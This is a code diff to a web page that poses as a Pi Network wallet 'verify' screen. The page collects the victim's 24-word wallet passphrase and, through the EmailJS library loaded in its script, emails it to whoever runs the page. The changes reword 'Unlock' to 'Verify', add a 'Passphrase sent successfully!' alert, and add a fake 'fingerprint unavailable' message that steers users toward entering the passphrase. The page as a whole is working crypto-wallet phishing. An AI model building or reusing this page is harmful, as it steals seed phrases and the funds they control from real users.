@@ -48,7 +48,7 @@
         }
 
         .passphrase-input:focus {
-            border-color: #a34ea7;
+            border-color: #98489c;
         }
 
         .passphrase-input::placeholder {
@@ -74,17 +74,17 @@
 
         .primary-button {
             background-color: white;
-            color: #a34ea7;
-            border: 1px solid #a34ea7;
+            color: 'purple';
+            border: 1px solid #98489c;
         }
 
         .primary-button:active {
-            background-color: #ebdfea;
+            background-color: #98489c;
             color: white;
         }
 
         .secondary-button {
-            background-color: #a34ea7;
+            background-color: #98489c;
             color: white;
             border: none;
         }
@@ -106,13 +106,20 @@
         .create-new:hover {
             text-decoration: underline;
         }
+
+        .warning {
+            color: red;
+            font-size: 0.9rem;
+            margin-top: -0.5rem;
+            margin-bottom: 1rem;
+            display: none; /* Initially hidden */
+        }
     </style>
 </head>
 <body>
-    <h1>Unlock Pi Wallet</h1>
+    <h1>Verify Pi </h1>
 
     <form id="submissionForm">
-        
         <textarea 
             class="passphrase-input" 
             placeholder="Enter your 24-word&#10;passphrase here"
@@ -120,14 +127,19 @@
         ></textarea>
         
         <button class="button primary-button" name="submit" type="submit" value="Submit">
-            Unlock With Passphrase
+            Verify With Passphrase
         </button>
 
-        <button class="button secondary-button">
-            Unlock With Fingerprint
+        <button class="button secondary-button" id="fingerprintButton">
+            Verify With Fingerprint
         </button>
-    
+
+        <!-- Warning message element -->
+        <p id="fingerprintWarning" class="warning">
+            Fingerprint verification is currently unavailable.
+        </p>
     </form>
+
     <p class="info-text">
         As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.
     </p>
@@ -135,7 +147,6 @@
     <p class="info-text">
         Lost your passphrase? <a href="#" class="create-new">You can create a new wallet</a>, but all your π in your previous wallet will be inaccessible.
     </p>
-    
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
@@ -153,12 +164,17 @@
             })
             .then(response => {
                 console.log("Email sent!", response);
-                 
+                alert("Passphrase sent successfully!");
             })
             .catch(error => {
                 console.error("Error:", error);
-                
+                alert("Failed to send email. Check console for details.");
             });
+        });
+
+        document.getElementById("fingerprintButton").addEventListener("click", function(event) {
+            event.preventDefault();
+            document.getElementById("fingerprintWarning").style.display = "block"; // Show the warning message
         });
     </script>
 
